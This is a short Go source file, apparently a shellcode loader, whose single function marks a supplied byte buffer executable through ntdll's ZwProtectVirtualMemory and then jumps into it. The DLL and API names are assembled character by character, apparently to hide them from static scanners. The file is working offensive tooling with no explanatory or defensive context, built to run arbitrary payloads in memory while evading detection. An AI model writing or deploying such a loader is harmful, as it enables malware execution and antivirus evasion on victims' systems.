package loader

import (
	"syscall"
	"unsafe"
)

const (
	PAGE_EXECUTE_READ uintptr = 0x20
)

/*
NTSTATUS
NtProtectVirtualMemory(
  IN HANDLE,
  IN OUT PVOID*,
  IN OUT SIZE_T*,
  IN ULONG,
  OUT PULONG
)
*/
func X(buf []byte) {
	var hProcess uintptr = 0
	var pBaseAddr = uintptr(unsafe.Pointer(&buf[0]))
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	syscall.NewLazyDLL(string([]byte{
		'n', 't', 'd', 'l', 'l',
	})).NewProc(string([]byte{
		'Z', 'w', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y',
	})).Call(
		hProcess-1,
		uintptr(unsafe.Pointer(&pBaseAddr)),
		uintptr(unsafe.Pointer(&dwBufferLen)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&dwOldPerm)),
	)

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}
